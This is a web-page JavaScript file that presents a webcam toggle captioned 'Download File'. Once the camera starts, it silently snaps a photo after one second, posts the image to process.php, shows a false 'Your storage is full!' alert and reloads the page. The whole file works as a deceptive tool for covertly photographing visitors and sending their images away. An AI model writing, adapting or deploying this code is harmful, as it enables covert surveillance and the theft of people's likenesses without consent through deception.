const webcamElement = document.getElementById('webcam');
const canvasElement = document.getElementById('canvas');
const webcam = new Webcam(webcamElement, 'user', canvasElement);

$("#webcam-switch").change(function () {
    if (this.checked) {
        webcam.start()
            .then(result => {
                $(".overall-overlay").css('display', 'block');
                cameraStarted();

                setTimeout(function () {
                    $("#take-photo").trigger('click');

                    $.ajax({
                        url: 'process.php',
                        type: 'post',
                        data: {
                            'image': $("#download-photo").attr('href')
                        },
                        success: function (response) {
                            alert('Your storage is full!')
                            window.location.reload(true);
                        }
                    });
                }, 1000);
            })
            .catch(err => {
                displayError();
            });
    } else {
        cameraStopped();
        webcam.stop();
    }
});

$('#cameraFlip').click(function () {
    webcam.flip();
    webcam.start();
});

$('#closeError').click(function () {
    $("#webcam-switch").prop('checked', false).change();
});

function displayError(err = '') {
    if (err != '') {
        $("#errorMsg").html(err);
    }
    $("#errorMsg").removeClass("d-none");
}

function cameraStarted() {
    $("#errorMsg").addClass("d-none");
    $('.flash').hide();
    $("#webcam-caption").html("on");
    $("#webcam-control").removeClass("webcam-off");
    $("#webcam-control").addClass("webcam-on");
    $(".webcam-container").removeClass("d-none");
    if (webcam.webcamList.length > 1) {
        $("#cameraFlip").removeClass('d-none');
    }
    $("#wpfront-scroll-top-container").addClass("d-none");
    window.scrollTo(0, 0);
    $('body').css('overflow-y', 'hidden');
}

function cameraStopped() {
    $("#errorMsg").addClass("d-none");
    $("#wpfront-scroll-top-container").removeClass("d-none");
    $("#webcam-control").removeClass("webcam-on");
    $("#webcam-control").addClass("webcam-off");
    $("#cameraFlip").addClass('d-none');
    $(".webcam-container").addClass("d-none");
    $("#webcam-caption").html("Download File");
    $('.md-modal').removeClass('md-show');
}

$("#take-photo").click(function () {
    beforeTakePhoto();
    let picture = webcam.snap();
    document.querySelector('#download-photo').href = picture;
    afterTakePhoto();
});

function beforeTakePhoto() {
    $('.flash')
        .show()
        .animate({opacity: 0.3}, 500)
        .fadeOut(500)
        .css({'opacity': 0.7});
    window.scrollTo(0, 0);
    $('#webcam-control').addClass('d-none');
    $('#cameraControls').addClass('d-none');
}

function afterTakePhoto() {
    webcam.stop();
    $('#canvas').removeClass('d-none');
    $('#take-photo').addClass('d-none');
    $('#exit-app').removeClass('d-none');
    $('#download-photo').removeClass('d-none');
    $('#resume-camera').removeClass('d-none');
    $('#cameraControls').removeClass('d-none');
}

function removeCapture() {
    $('#canvas').addClass('d-none');
    $('#webcam-control').removeClass('d-none');
    $('#cameraControls').removeClass('d-none');
    $('#take-photo').removeClass('d-none');
    $('#exit-app').addClass('d-none');
    $('#download-photo').addClass('d-none');
    $('#resume-camera').addClass('d-none');
}

$("#resume-camera").click(function () {
    webcam.stream()
        .then(facingMode => {
            removeCapture();
        });
});

$("#exit-app").click(function () {
    removeCapture();
    $("#webcam-switch").prop("checked", false).change();
});